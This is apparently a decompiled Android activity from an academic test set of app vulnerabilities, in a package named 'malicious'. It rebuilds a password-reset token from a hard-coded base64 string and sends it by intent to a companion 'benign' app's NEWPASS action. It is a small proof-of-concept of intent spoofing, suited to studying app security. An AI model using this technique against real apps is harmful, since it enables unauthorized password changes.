package edu.ksu.cs.malicious;

import android.content.Intent;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Base64;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;

public class MainActivity
  extends AppCompatActivity
{
  public MainActivity() {}
  
  private String recreateToken(String paramString)
  {
    paramString = Base64.decode(paramString, 0);
    byte[] arrayOfByte = new byte[32];
    int j = 0;
    int i = paramString.length - 32;
    while (i < paramString.length)
    {
      arrayOfByte[j] = paramString[i];
      j += 1;
      i += 1;
    }
    return Base64.encodeToString(arrayOfByte, 0);
  }
  
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    setContentView(2131296283);
  }
  
  protected void onResume()
  {
    super.onResume();
    final EditText localEditText = (EditText)findViewById(2131165260);
    localEditText.setText("DoA/0y0QJIOBsTzLc5S/wg79FMgaKfoVpymt5cUSQ8K3pnjTK2GVnIYMDKTIlT+y");
    ((Button)findViewById(2131165277)).setOnClickListener(new View.OnClickListener()
    {
      public void onClick(View paramAnonymousView)
      {
        paramAnonymousView = MainActivity.this.recreateToken(localEditText.getText().toString());
        Intent localIntent = new Intent("edu.ksu.cs.benign.NEWPASS");
        localIntent.putExtra("token", paramAnonymousView);
        MainActivity.this.startActivity(localIntent);
      }
    });
  }
}
